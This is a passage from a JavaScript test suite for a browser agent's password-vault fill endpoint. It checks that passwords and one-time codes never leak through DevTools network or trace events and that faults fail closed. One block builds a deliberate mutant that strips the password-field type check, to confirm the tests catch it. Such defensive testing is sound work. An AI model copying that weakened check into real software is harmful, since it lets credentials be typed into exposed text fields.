      const replayAfter2 = await medNet.call('Network.replayXHR', { requestId: 'req-submit-after' }, medNet.sid);
      await medNet.call('Tracing.end', {});
      await new Promise((r) => setTimeout(r, 40));
      const ioReadTainted = await medNet.call('IO.read', { handle: 'trace-stream-1' });

      relay.state.hook = null;
      const allReceived = JSON.stringify({
        events: medNet.events,
        netPostDuringId,
        netPostAfterId,
        netPostUnknownId,
        fetchPostAfter,
        replayAfter,
        replayAfter2,
        ioReadTainted,
      });
      // Decode any `postDataEntries.bytes` that survived in `medNet.events` to verify 0 decoded secret hits too!
      let decodedEntryLeak = false;
      for (const ev of medNet.events) {
        const entries = ev?.params?.request?.postDataEntries;
        if (Array.isArray(entries)) {
          for (const ent of entries) {
            if (typeof ent?.bytes === 'string') {
              const dec = Buffer.from(ent.bytes, 'base64').toString('utf8');
              if (dec.includes(OTP_VAL) || dec.includes(PW_ALICE)) decodedEntryLeak = true;
            }
          }
        }
      }
      medNet.close();

      ok(
        !traceStartBefore.error
          && !traceStartDuring.error
          && fenceLifted
          && !allReceived.includes(OTP_VAL)
          && !allReceived.includes(PW_ALICE)
          && !allReceived.includes(encodeURIComponent(PW_ALICE))
          && !allReceived.includes(shiftedB64)
          && !decodedEntryLeak
          && Boolean(netPostDuringId.error) && Boolean(netPostAfterId.error) && Boolean(netPostUnknownId.error)
          && Boolean(fetchPostAfter.error)
          && Boolean(replayAfter.error) && Boolean(replayAfter2.error)
          && Boolean(ioReadTainted.error),
        'R28-4 (Point 4): credential-carrying request bodies (both >=8B password and 6-digit OTP, raw and shifted base64 postDataEntries) never appear in Network/Fetch events, getRequestPostData, replayXHR, or Tracing/IO.read both DURING fill and AFTER submit lifts the fence',
        {
          fenceLifted,
          decodedEntryLeak,
          hasOtp: allReceived.includes(OTP_VAL),
          hasPw: allReceived.includes(PW_ALICE),
          netPostDuringErr: netPostDuringId.error,
          netPostAfterErr: netPostAfterId.error,
          netPostUnknownErr: netPostUnknownId.error,
          fetchPostAfterErr: fetchPostAfter.error,
          replayAfterErr: replayAfter.error,
          ioReadErr: ioReadTainted.error,
        },
      );
      await clearTabFenceByNav();
    }

    // ── R28-5a: Driver 2 Group 1 + `3L` — Protocol error/timeout fail-closed (`409 target_not_found`, `0` `Input.insertText`) ──
    {
      const seedRef = async () => {
        await dialogs.noteSnapshot({ profileId: PID, browserKey: KEY }, {
          targetId: mainTid,
          parsedRefs: [{ ref: 'e2', role: 'textbox', name: 'Password' }],
        });
      };

      const runFault = async (label, target, hookFn) => {
        resetDom();
        await seedRef();
        const beforeCount = relay.state.upstreamCalls.length;
        relay.state.hook = hookFn;
        const r = await post('/api/agent/browser/fill-vault', {
          profile: PID,
          target,
          spec: 'shop.example.test#alice/password',
          targetId: mainTid,
        });
        relay.state.hook = null;
        const slice = relay.state.upstreamCalls.slice(beforeCount);
        const inserts = slice.filter((c) => c.method === 'Input.insertText').length;
        const axCalls = slice.filter((c) => c.method === 'Accessibility.queryAXTree').length;
        return { label, status: r.status, code: r.json?.code, inserts, axCalls };
      };

      let once1 = false;
      const fTargetErr = await runFault('getTargetInfo-err', '#pw', async (m, { sendToClient }) => {
        if (!once1 && m.method === 'Target.getTargetInfo') {
          once1 = true;
          sendToClient({ id: m.id, error: { code: -32000, message: 'No target info' } });
          return true;
        }
        return false;
      });
      let once2 = false;
      const fTargetTimeout = await runFault('getTargetInfo-timeout', '#pw', async (m) => {
        if (!once2 && m.method === 'Target.getTargetInfo') { once2 = true; return true; }
        return false;
      });
      let once3 = false;
      const fDescErr = await runFault('describeNode-err', '@e2', async (m, { sendToClient }) => {
        if (!once3 && m.method === 'DOM.describeNode') {
          once3 = true;
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'describeNode failed' } });
          return true;
        }
        return false;
      });
      let once4 = false;
      const fDescTimeout = await runFault('describeNode-timeout', '@e2', async (m) => {
        if (!once4 && m.method === 'DOM.describeNode') { once4 = true; return true; }
        return false;
      });
      let once5 = false;
      const fAxOnce = await runFault('queryAXTree-once', '@e2', async (m, { sendToClient }) => {
        if (!once5 && m.method === 'Accessibility.queryAXTree') {
          once5 = true;
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'AX error on first alias' } });
          return true;
        }
        return false;
      });

      ok(
        [fTargetErr, fTargetTimeout, fDescErr, fDescTimeout, fAxOnce].every((x) => x.status === 409 && x.code === 'target_not_found' && x.inserts === 0)
          && fAxOnce.axCalls === 1,
        'R28-5a (Driver 2 Group 1 + 3L): Target.getTargetInfo error/timeout, DOM.describeNode error/timeout, and first-alias short-socket queryAXTree error (axCalls===1) all fail closed 409 target_not_found with 0 Input.insertText',
        { fTargetErr, fTargetTimeout, fDescErr, fDescTimeout, fAxOnce },
      );
      await clearTabFenceByNav();
    }

    // ── R28-5b: Driver 2 Group 2 + Extra SPA Nail — Watch disconnect `@ref` stash (same-URL 200, changed-URL expired hint, SPA type-swap `login_bad_field`) ──
    {
      const waitWatchReady = async () => {
        await new Promise((r) => setTimeout(r, 20));
        await dialogs.arm(PID);
      };

      // 1) Same URL reconnect -> next `@e2` fill relocates via short socket and returns 200
      resetDom(`${ORIGIN}/login`, 'password');
      await dialogs.noteSnapshot({ profileId: PID, browserKey: KEY }, {
        targetId: mainTid,
        parsedRefs: [{ ref: 'e2', role: 'textbox', name: 'Password' }],
      });
      let dropped1 = false;
      relay.state.hook = async (m, { closeClient }) => {
        if (!dropped1 && m.method === 'DOM.describeNode') {
          dropped1 = true;
          closeClient(1006, 'simulated watch drop');
          return true;
        }
        return false;
      };
      const firstDrop = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '@e2',
        spec: 'shop.example.test#alice/password',
        targetId: mainTid,
      });
      relay.state.hook = null;
      await waitWatchReady();
      const retrySameUrl = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '@e2',
        spec: 'shop.example.test#alice/password',
        targetId: mainTid,
      });
      const domSameUrl = fk.readDomValues(mainTid);
      await clearTabFenceByNav();

      // 2) Changed URL during disconnect -> refuses `409 target_not_found` naming `snapshot -i`
      await dialogs.noteSnapshot({ profileId: PID, browserKey: KEY }, {
        targetId: mainTid,
        parsedRefs: [{ ref: 'e2', role: 'textbox', name: 'Password' }],
      });
      fk.navigate(mainTid, `${ORIGIN}/step2`);
      resetDom(`${ORIGIN}/step2`, 'password');
      relay.dropClientSockets();
      await waitWatchReady();
      const retryChangedUrl = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '@e2',
        spec: 'shop.example.test#alice/password',
        targetId: mainTid,
      });
      await clearTabFenceByNav();

      // 3) EXTRA SPA NAIL (`go-r28`): Same URL (`https://shop.example.test/login`), watch disconnects,
      //    and SPA replaces `<input type="password" name="Password">` with `<input type="text" name="Password">`
      //    without changing URL -> restored `@e2` relocates to the text box, target check catches type mismatch,
      //    and refuses `409 login_bad_field` with `0` `Input.insertText`!
      resetDom(`${ORIGIN}/login`, 'password');
      await dialogs.noteSnapshot({ profileId: PID, browserKey: KEY }, {
        targetId: mainTid,
        parsedRefs: [{ ref: 'e2', role: 'textbox', name: 'Password' }],
      });
      relay.dropClientSockets();
      resetDom(`${ORIGIN}/login`, 'text'); // SPA swapped DOM at identical URL!
      await waitWatchReady();
      const beforeSpaCalls = relay.state.upstreamCalls.length;
      const retrySpaSwap = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '@e2',
        spec: 'shop.example.test#alice/password',
        targetId: mainTid,
      });
      const spaInserts = relay.state.upstreamCalls.slice(beforeSpaCalls).filter((c) => c.method === 'Input.insertText').length;
      const domSpaSwap = fk.readDomValues(mainTid);

      ok(
        firstDrop.status === 409 && firstDrop.json?.code === 'target_not_found'
          && retrySameUrl.status === 200 && domSameUrl.pw === PW_ALICE
          && retryChangedUrl.status === 409 && retryChangedUrl.json?.code === 'target_not_found'
          && /snapshot -i/.test(String(retryChangedUrl.json?.error || ''))
          && (retrySpaSwap.status === 400 || retrySpaSwap.status === 409) && retrySpaSwap.json?.code === 'login_bad_field'
          && spaInserts === 0 && domSpaSwap.pw === '',
        'R28-5b (Driver 2 Group 2 + Extra SPA Nail): watch disconnect stashes @ref specs for 200 retry on same URL, names snapshot -i on URL change, and refuses 409 login_bad_field (0 Input.insertText) when SPA swaps <input type=password> to <input type=text> at the same URL',
        {
          firstDrop: firstDrop.status,
          retrySameUrl: retrySameUrl.status,
          retryChangedUrl: { status: retryChangedUrl.status, err: retryChangedUrl.json?.error },
          retrySpaSwap: { status: retrySpaSwap.status, code: retrySpaSwap.json?.code, spaInserts, domSpaSwap },
        },
      );

      // MUTANT 34 RED (SPA type-check stripped in `browser-login-fill.js`):
      // MUTANT 34 RED (stripping password-type check in `browser-login-fill.js` lets SPA-swapped `<input type="text">` receive password!):
      if (MUT && LF) {
        const lfSrc = fs.readFileSync(path.join(repoDir, 'src/server/browser-login-fill.js'), 'utf8');
        const m34Src = lfSrc.replaceAll(
          "const wantSecretPw = Boolean(secret && slot !== 'otp');",
          'const wantSecretPw = false;',
        );
        if (m34Src !== lfSrc) {
          const LF_M34 = MUT.load('src/server/browser-login-fill.js', m34Src, 'r28-spa-password-type-check-stripped');
          const rawWs = new WebSocket(fk.wsUrl);
          await new Promise((r) => rawWs.once('open', r));
          let cseq = 0;
          const pmap = new Map();
          rawWs.on('message', (d) => {
            const m = JSON.parse(String(d));
            if (pmap.has(m.id)) { const fn = pmap.get(m.id); pmap.delete(m.id); fn(m); }
          });
          const bCall = (method, params) => new Promise((r) => { const id = ++cseq; pmap.set(id, r); rawWs.send(JSON.stringify({ id, method, params })); });
          const attM = await bCall('Target.attachToTarget', { targetId: mainTid, flatten: true });
          const sCall = (method, params) => new Promise((r) => { const id = ++cseq; pmap.set(id, r); rawWs.send(JSON.stringify({ id, method, params, sessionId: attM.result.sessionId })); });
          resetDom(`${ORIGIN}/login`, 'text');
          let mutInserts = 0;
          const sCallCounted = async (method, params) => {
            if (method === 'Input.insertText') mutInserts++;
            return sCall(method, params);
          };
          const mutOut = await LF_M34.fillVaultElement({
            call: sCallCounted,
            browserCall: bCall,
            targetId: mainTid,
            trackedUrl: () => `${ORIGIN}/login`,
            origin: ORIGIN,
            target: '#pw',
            slot: 'password',
            secret: true,
            resolveValue: () => ({ ok: true, value: 'MutantTypedIntoText!1', secret: true }),
          });
          rawWs.close();
          ok(
            mutOut.ok === true && mutInserts === 1,
            'MUTANT 34 RED (R28-5b SPA password-type guard): stripping wantSecretPw password-type check lets SPA-swapped <input type=text> receive Input.insertText (mutInserts===1)',
            { mutOut, mutInserts },
          );
        } else {
          ok(false, 'MUTANT 34 RED: anchor not found in src/server/browser-login-fill.js');
        }
      }
      await clearTabFenceByNav();
    }

    // ── R28-5c: Driver 2 Group 3 — `--generate` rollback on confirmed-empty `Input.insertText` error vs fail-closed on timeout ──
    // B-1217 (lane bl-loop-b, 主开发 r4407): THE ROLLBACK's FACTS, read before a retry is judged. After an Input.insertText error the
    // product rolls a generated pending back (and lifts the tab's fence) ONLY once its wipe VERIFIED the field empty — each of the
    // wipe's CDP calls bounded at 1500 ms (src/server/browser-dialogs.js: call(…, 1500)); a missed answer leaves the fence and the
    // pending as they are: fail closed BY DESIGN, and the immediate retry is refused (409). The one red (run 22d33fcd2-20261119033909
    // -both, UTC: chg2 409, its For-you count back as judged) is that road under the machine's load. So the leg reads the facts first:
    // they are there ⇒ the retries are judged as before; they are not ⇒ a NAMED HARNESS line, never a 409 read as the product's red.
    // Its CONTROL (below the scene) places that branch (the wipe answered «one value remains», where a missed answer also ends) — red at will
    const rollFactsOf = (name) => {
      const ent = (logins.list().entries || []).find((x) => x && x.name === name) || null;
      const fenceLifted = dialogs.liveFillOnTarget(PID, mainTid) === null;
      return { fenceLifted, pending: ent ? !!ent.pending : null, rolledBack: fenceLifted && !(ent && ent.pending) };
    };
    {
      resetDom();
      const fyBefore = forYou.openCount();

      // 1) Change `--generate` + `Input.insertText` error -> rolls back pending + card, immediate retry returns 200
      let failInsChange = false;
      relay.state.hook = async (m, { sendToClient }) => {
        if (!failInsChange && m.method === 'Input.insertText') {
          failInsChange = true;
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'Insert failed on change' } });
          return true;
        }
        return false;
      };
      const chg1 = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'shop.example.test#alice/password',
        generate: true,
        targetId: mainTid,
      });
      relay.state.hook = null;
      const fyAfterChgRollback = forYou.openCount();
      const chgRoll = rollFactsOf(BL.entryName(ORIGIN, 'alice'));   // B-1217: the change's rollback, read before its retry
      const chg2 = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'shop.example.test#alice/password',
        generate: true,
        targetId: mainTid,
      });
      // Clean up staged change pending so entry stays clean
      logins.discardPending(BL.entryName(ORIGIN, 'alice'), { by: 'owner' });
      await clearTabFenceByNav();

      // 2) Register `new:` `--generate` + `Input.insertText` error -> drops unconfirmed entry + card, immediate retry returns 200
      let failInsReg = false;
      relay.state.hook = async (m, { sendToClient }) => {
        if (!failInsReg && m.method === 'Input.insertText') {
          failInsReg = true;
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'Insert failed on register' } });
          return true;
        }
        return false;
      };
      const reg1 = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'new:shop.example.test#newbie/password',
        generate: true,
        targetId: mainTid,
      });
      relay.state.hook = null;
      const regRoll = rollFactsOf(BL.entryName(ORIGIN, 'newbie'));   // B-1217: the register's rollback (its entry dropped), read before its retry
      const reg2 = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'new:shop.example.test#newbie/password',
        generate: true,
        targetId: mainTid,
      });
      await clearTabFenceByNav();

      // 3) Register `new:` `--generate` + `Input.insertText` TIMEOUT (cannot confirm whether Chrome typed!) ->
      //    MUST stay fail-closed (`409 login_exists` on retry of `new:`) AND tell caller to fill `/pending` or discard!
      let hangInsReg = false;
      relay.state.hook = async (m) => {
        if (!hangInsReg && m.method === 'Input.insertText') {
          hangInsReg = true;
          return true; // hang -> triggers Input.insertText timeout (`insUncertain`)
        }
        return false;
      };
      const regTimeout1 = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'new:shop.example.test#uncertain/password',
        generate: true,
        targetId: mainTid,
      });
      relay.state.hook = null;
      await clearTabFenceByNav();
      const regTimeoutRetryNew = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'new:shop.example.test#uncertain/password',
        generate: true,
        targetId: mainTid,
      });
      const regTimeoutFillPending = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'shop.example.test#uncertain/pending',
        targetId: mainTid,
      });

      const rolled = chgRoll.rolledBack && regRoll.rolledBack;
      ok(
        rolled && chg1.status === 409 && fyAfterChgRollback === fyBefore && chg2.status === 200
          && reg1.status === 409 && reg2.status === 200
          && regTimeout1.status === 409
          && regTimeoutRetryNew.status === 409 && regTimeoutRetryNew.json?.code === 'login_exists'
          && /--vault .*\/password|\/pending|discard/i.test(String(regTimeoutRetryNew.json?.error || ''))
          && regTimeoutFillPending.status === 200,
        rolled ? 'R28-5c (Driver 2 Group 3): --generate change and new: register roll back pending + For-you card on confirmed-empty Input.insertText error (immediate retry 200), while Input.insertText timeout stays fail-closed and points to /pending (200)'
          : `HARNESS (R28-5c): after a failed insert the rollback's facts are NOT there (the change: ${JSON.stringify(chgRoll)}; the register: ${JSON.stringify(regRoll)}) — the wipe's verification missed its 1500 ms CDP bound (the machine's load: the product fails closed by design, so the retries were refused); the retries are not judged`,
        {
          chgRoll, regRoll, chg2Code: chg2.json?.code,
          chg1: chg1.status,
          fyBefore,
          fyAfterChgRollback,
          chg2: chg2.status,
          reg1: reg1.status,
          reg2: reg2.status,
          regTimeoutRetryNew: { status: regTimeoutRetryNew.status, code: regTimeoutRetryNew.json?.code, err: regTimeoutRetryNew.json?.error },
          regTimeoutFillPending: regTimeoutFillPending.status,
        },
      );
      await clearTabFenceByNav();
    }

    // ── R28-5c's CONTROL (B-1217, lane bl-loop-b, 主开发 r4407): THE UNVERIFIED WIPE, PLACED — the one red's road, red at will ──
    // After the change's Input.insertText error the WIPE's own Runtime.evaluate (its expression the one that holds `_vsAllowHeuristic`) is
    // answered «one value remains»: the wipe cannot verify the field empty — THE SAME BRANCH a missed answer takes (a call past its 1500 ms
    // bound reads as not verified: src/server/browser-login-fill.js wipeTabTypedInputs ends verifiedEmpty false on both), answered at once
    // so the control costs no 1.5 s wait. The fence stays on the tab and the generated pending stays staged (fail closed by design), and
    // the immediate retry is refused — chg2's 409 of the one red, by a placed answer, never by load. The leg above reads exactly these
    // facts before it judges a retry: here they say «not rolled back»
    {
      resetDom();
      let failed = false, held = 0;
      relay.state.hook = async (m, { sendToClient }) => {
        if (!failed && m.method === 'Input.insertText') {
          failed = true;
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), error: { code: -32000, message: 'Insert failed (the control)' } });
          return true;
        }
        if (failed && !held && m.method === 'Runtime.evaluate' && String(m.params && m.params.expression).includes('_vsAllowHeuristic')) {   // THE PLACED ANSWER: the wipe cannot verify
          held++;
          sendToClient({ id: m.id, ...(m.sessionId ? { sessionId: m.sessionId } : {}), result: { result: { type: 'object', value: { ok: true, wiped: 0, remaining: 1, hasFrames: false } } } });
          return true;
        }
        return false;
      };
      const c1 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'shop.example.test#alice/password', generate: true, targetId: mainTid });
      relay.state.hook = null;
      const roll = rollFactsOf(BL.entryName(ORIGIN, 'alice'));
      const c2 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'shop.example.test#alice/password', generate: true, targetId: mainTid });
      ok(held === 1 && c1.status === 409 && !roll.rolledBack && c2.status === 409,
        'R28-5c CONTROL (the unverified wipe, PLACED: its Runtime.evaluate answered «one value remains», the branch a missed answer takes): the fence stays and the pending stays (fail closed), and the immediate retry is refused 409 — the one red\'s shape at will; the leg reads these facts before it judges a retry',
        { held, c1: c1.status, roll, c2: c2.status, c2Code: c2.json?.code });
      logins.discardPending(BL.entryName(ORIGIN, 'alice'), { by: 'owner' });
      await clearTabFenceByNav();
    }

    // ── R28-6a: Addendum `4-1` — First fill = 6-digit OTP (entry also has >=8B password) -> `vault.lock()` -> watch reconnect -> ceiling / same-origin submit ──
    {
      const syncHiddenOnTab = async (tid, srcSel, hidSel) => {
        const syncWs = new WebSocket(fk.wsUrl);
        await new Promise((r) => syncWs.once('open', r));
        const sc = (id, method, params, sessionId) => new Promise((r) => {
          const fn = (d) => { const m = JSON.parse(String(d)); if (m.id === id) { syncWs.off('message', fn); r(m); } };
          syncWs.on('message', fn);
          syncWs.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
        });
        const sa = await sc(1, 'Target.attachToTarget', { targetId: tid, flatten: true });
        const sw = await sc(2, 'Page.createIsolatedWorld', { frameId: tid, worldName: 'form-sync' }, sa.result.sessionId);
        await sc(3, 'Runtime.evaluate', {
          contextId: sw.result.executionContextId,
          expression: `(() => { const h = document.querySelector(${JSON.stringify(hidSel)}); const v = document.querySelector(${JSON.stringify(srcSel)}).value; h.value = v; h.defaultValue = v; h.setAttribute('value', v); return true; })()`,
          returnByValue: true,
        }, sa.result.sessionId);
        syncWs.close();
      };

      const otpTab = fk.addTarget(`${ORIGIN}/otp-step`);
      fk.setDom(otpTab, {
        url: `${ORIGIN}/otp-step`,
        elements: [
          { id: 'otp', tag: 'input', type: 'text', name: 'Verification code' },
          { id: 'otp_hidden', tag: 'input', type: 'hidden', name: 'code_hidden' },
        ],
      });
      await new Promise((r) => setTimeout(r, 90));
      await mediator.admitTarget({ profileId: PID, browserKey: KEY, targetId: otpTab });
      dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, otpTab);
      dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, otpTab);

      const fOtp = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#otp',
        spec: 'shop.example.test#alice/otp',
        targetId: otpTab,
      });
      await syncHiddenOnTab(otpTab, '#otp', '#otp_hidden');
      vault.lock();
      clock += 16 * 60_000;
      relay.dropClientSockets();
      await new Promise((r) => setTimeout(r, 30));
      await dialogs.arm(PID);
      await new Promise((r) => setTimeout(r, 40));
      const readOtpAfter = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['get', 'value', '#otp_hidden'], targetId: otpTab });
      const domOtpAfter = fk.readDomValues(otpTab);
      const otpExposed = (domOtpAfter.otp === OTP_VAL || domOtpAfter.otp_hidden === OTP_VAL) && readOtpAfter.status === 200;

      await vault.unlock('VaultR28#SecondPw');
      ok(
        fOtp.status === 200 && !otpExposed
          && ((domOtpAfter.otp === '' && domOtpAfter.otp_hidden === '') || (readOtpAfter.status === 409 && readOtpAfter.json?.code === 'login_fill_live')),
        'R28-6a (Property 4 4-1): first fill = 6-digit OTP (entry also has >=8B password) -> vault.lock() -> watch reconnect -> ceiling expiry never drops fence with 6-digit OTP still on page',
        { fOtp: fOtp.status, domOtpAfter, readOtpAfter: { status: readOtpAfter.status, code: readOtpAfter.json?.code }, otpExposed },
      );
    }

    // ── R28-6b: Addendum `4-2` — Tab 1 caches another site's `>= 8`-byte password while never-filled Tab 2 fills `< 8`-byte short password ──
    {
      const OTHER_ORIGIN = 'https://other.example.test';
      const SHORT_ORIGIN = 'https://short.example.test';
      const OTHER_LONG_PW = 'OtherSiteLongPw!8821';
      const SHORT_SITE_PW = 'Sh!7'; // 4 bytes (< 8 bytes)

      logins.addOwn({ origin: OTHER_ORIGIN, username: 'bob', password: OTHER_LONG_PW }, { who: 'owner' });
      logins.addOwn({ origin: SHORT_ORIGIN, username: 'alice', password: SHORT_SITE_PW }, { who: 'owner' });
      grants.set('browser-login', `${OTHER_ORIGIN}#*`, { to: [{ kind: 'conversation', key: CONV_ID }], except: [] });
      grants.set('browser-login', `${SHORT_ORIGIN}#*`, { to: [{ kind: 'conversation', key: CONV_ID }], except: [] });

      const tabOther = fk.addTarget(`${OTHER_ORIGIN}/login`);
      const tabShort = fk.addTarget(`${SHORT_ORIGIN}/login`);
      fk.setDom(tabOther, { url: `${OTHER_ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      fk.setDom(tabShort, {
        url: `${SHORT_ORIGIN}/login`,
        elements: [
          { id: 'pw', tag: 'input', type: 'password', name: 'Password' },
          { id: 'pw_hidden', tag: 'input', type: 'hidden', name: 'pw_hidden' },
        ],
      });
      await new Promise((r) => setTimeout(r, 90));
      dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tabOther);
      dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tabShort);

      // Fill long password on Tab 1 (`other.example.test`), then `< 8`-byte short password on never-filled Tab 2 (`short.example.test`)
      // B-21cc (r2491): a vault fill acts on the conversation's CURRENT tab — the scene switches to each tab first, as an agent does
      dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tabOther);
      const f1 = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'other.example.test#bob/password',
        targetId: tabOther,
      });
      dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tabShort);
      const f2 = await post('/api/agent/browser/fill-vault', {
        profile: PID,
        target: '#pw',
        spec: 'short.example.test#alice/password',
        targetId: tabShort,
      });
      {
        const syncWs = new WebSocket(fk.wsUrl);
        await new Promise((r) => syncWs.once('open', r));
        const sc = (id, method, params, sessionId) => new Promise((r) => {
          const fn = (d) => { const m = JSON.parse(String(d)); if (m.id === id) { syncWs.off('message', fn); r(m); } };
          syncWs.on('message', fn);
          syncWs.send(JSON.stringify({ id, method, params, ...(sessionId ? { sessionId } : {}) }));
        });
        const sa = await sc(1, 'Target.attachToTarget', { targetId: tabShort, flatten: true });
        const sw = await sc(2, 'Page.createIsolatedWorld', { frameId: tabShort, worldName: 'form-sync' }, sa.result.sessionId);
        await sc(3, 'Runtime.evaluate', {
          contextId: sw.result.executionContextId,
          expression: '(() => { const h = document.querySelector("#pw_hidden"); const v = document.querySelector("#pw").value; h.value = v; h.defaultValue = v; h.setAttribute("value", v); return true; })()',
          returnByValue: true,
        }, sa.result.sessionId);
        syncWs.close();
      }

      // Simulate Hub restart where `dialogsRestart` boots UNLOCKED (rehydrating persisted `login-fences.json`),
      // followed by `vault.lock()` + watch reconnect + 15-min ceiling expiry!
      // Clear in-process `LF` map ONLY to mirror a fresh Hub process rebooting unlocked before locking:
      // (Note: R28-6c below ALSO tests real fresh OS child processes with ZERO `clear*` calls!)
      dialogs.shutdown();
      LF?.clearAllFilledSecrets?.();

      const dialogsRestart = Dm.create({
        keeper,
        logins,
        now: () => clock,
        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
        leaseCountOf: () => 1,
        isVaultLocked: () => vault.state() !== 'unlocked',
        log: quiet,
      });
      vault.onLock(() => { try { dialogsRestart.onVaultLock?.(); } catch { /* optional */ } });
      Rm.setup({ keeper, activeSessions: sessions, dialogs: dialogsRestart, logins, tasksForSession: () => [] });

      await dialogsRestart.arm(PID); // Unlocked boot -> `rearmLoginFences` runs!
      dialogsRestart.bindTab?.({ profileId: PID, browserKey: KEY }, tabShort);
      dialogsRestart.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tabShort);

      vault.lock();
      clock += 16 * 60_000;
      relay.dropClientSockets();
      await new Promise((r) => setTimeout(r, 30));
      await dialogsRestart.arm(PID);
      await new Promise((r) => setTimeout(r, 40));
      const readShortAfter = await post('/api/agent/browser/resolve', { wrapper: true, argv: ['get', 'value', '#pw_hidden'], targetId: tabShort });
      const domShortAfter = fk.readDomValues(tabShort);
      const shortExposed = (domShortAfter.pw === SHORT_SITE_PW || domShortAfter.pw_hidden === SHORT_SITE_PW) && readShortAfter.status === 200;

      dialogsRestart.shutdown();
      dialogs = null;
      await vault.unlock('VaultR28#SecondPw');

      ok(
        f1.status === 200 && f2.status === 200 && !shortExposed
          && ((domShortAfter.pw === '' && domShortAfter.pw_hidden === '') || (readShortAfter.status === 409 && readShortAfter.json?.code === 'login_fill_live')),
        'R28-6b (Property 4 4-2): never-filled Tab 2 with <8B short password alongside Tab 1\'s >=8B other-site password never drops fence with short password still in #pw after restart + vault.lock() + ceiling expiry',
        { f1: f1.status, f2: f2.status, domShortAfter, readShortAfter: { status: readShortAfter.status, code: readShortAfter.json?.code }, shortExposed },
      );
    }

    // ── R28-6c: Addendum — 3 True First-Fill Child-Process Scenarios (`long`, `short`, `otp`) ──
    {
      const [longSame, shortSame, otpSame, longCold, shortCold, otpCold, raceCold] = await r28ChildrenPromise;
      ok(
        longSame.ok === true && shortSame.ok === true && otpSame.ok === true
          && longCold.ok === true && shortCold.ok === true && otpCold.ok === true,
        'R28-6c (Property 4 true first-fill child processes × 3): brand-new process + never-filled tab + 1 single fill + vault.lock() + reconnect (and 2nd-process never-unlocked cold boot) fails closed for long password (>=8B), short password (<8B), and 6-digit OTP',
        { longSame, shortSame, otpSame, longCold, shortCold, otpCold },
      );
      // r2913: THE RED CONTROL — the leg's old form, the race placed: a stand-in keeper with NO landing wait, its fence write held at the
      // store writer's rename, its child exiting at once after the fill's 200: the record is lost, and the cold second process READS the
      // held tab (200). That was the short case's red once on the candidate's whole tier; with the landing wait carried, the leg above
      // judges the product's road (the fill types only once the record is on disk)
      ok(
        !!(raceCold.fillStep && raceCold.fillStep.fillStatus === 200 && raceCold.bootStep && raceCold.bootStep.readHeldStatus === 200),
        'R28-6c RED CONTROL (r2913): a stand-in keeper with NO landing wait whose child exits at once after the fill (its fence write held at the store writer\'s rename, placed) LOSES the record: the cold second process reads the held tab',
        { fillStatus: raceCold.fillStep && raceCold.fillStep.fillStatus, readHeldStatus: raceCold.bootStep && raceCold.bootStep.readHeldStatus, readHeldCode: raceCold.bootStep && raceCold.bootStep.readHeldCode },
      );
    }
  } finally {
    try { LF?.clearAllFilledSecrets?.(); } catch { /* */ }
    try { dialogs?.shutdown(); } catch { /* */ }
    try { vault?.close(); } catch { /* */ }
    if (srv) await new Promise((r) => srv.close(() => r()));
    try { await mediator?.shutdown(); } catch { /* */ }
    try { await relay?.close(); } catch { /* */ }
    try { await fk?.close(); } catch { /* */ }
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
}

// Standalone CLI entry (`--repo=<path>` or internal `--first-fill-worker=<kind>`)
if (process.argv[1] && path.resolve(process.argv[1]) === path.resolve(SELF_PATH)) {
  const repoArg = process.argv.find((a) => a.startsWith('--repo='));
  const workerArg = process.argv.find((a) => a.startsWith('--first-fill-worker='));
  const modeArg = process.argv.find((a) => a.startsWith('--worker-mode='));
  const repoDir = repoArg ? path.resolve(repoArg.slice('--repo='.length)) : path.resolve(path.dirname(SELF_PATH), '../..');

  if (workerArg) {
    const kind = workerArg.slice('--first-fill-worker='.length);
    const mode = modeArg ? modeArg.slice('--worker-mode='.length) : 'same-proc-lock';
    const flagOf = (k) => { const a = process.argv.find((x) => x.startsWith(`--${k}=`)); return a ? a.slice(k.length + 3) : ''; };
    const res = await runFirstFillWorker(repoDir, kind, mode, {
      dataDir: flagOf('data-dir'),
      wsUrl: flagOf('ws-url'),
      pid: flagOf('pid'),
      secret: flagOf('secret'),
      noLandingWait: process.argv.includes('--no-landing-wait'),   // r2913: the RED CONTROL's child only
    });
    process.stdout.write(JSON.stringify(res) + '\n', () => {
      process.exit(res.ok ? 0 : 1);
    });
  } else {
